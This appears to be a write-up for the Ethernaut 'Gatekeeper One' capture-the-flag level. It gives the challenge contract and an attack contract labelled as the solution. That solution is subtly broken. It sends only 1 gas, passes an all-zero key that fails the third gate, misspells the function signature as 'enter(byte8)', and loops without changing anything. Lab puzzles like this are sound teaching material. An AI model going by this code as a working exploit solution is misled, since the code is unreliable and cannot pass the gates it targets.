# Gatekeeper_One
Make it past the gatekeeper and register as an entrant to pass this level.

Things that might help: <br>
Remember what you've learned from the Telephone and Token levels. <br>
You can learn more about the special function gasleft(), in Solidity's documentation (see Units and Global Variables and External Function Calls). <br>


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

```
# solution:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./gatekeeperOne.sol";


contract attackGateOne {
    address public owner;
    GatekeeperOne public gatekeeperOne;


    constructor (GatekeeperOne _gateOneAddress) {
        owner = msg.sender;
        gatekeeperOne = GatekeeperOne(_gateOneAddress);
    }
  
  function _attackGate() public {
    bytes8 _gatekey = 0x00000;
    for (; ;) {   
        (bool result, ) = address(gatekeeperOne).call{gas: 1 }(abi.encodeWithSignature("enter(byte8)", _gatekey));
        if (result) {
            break;
        }
    }
  }
}
```
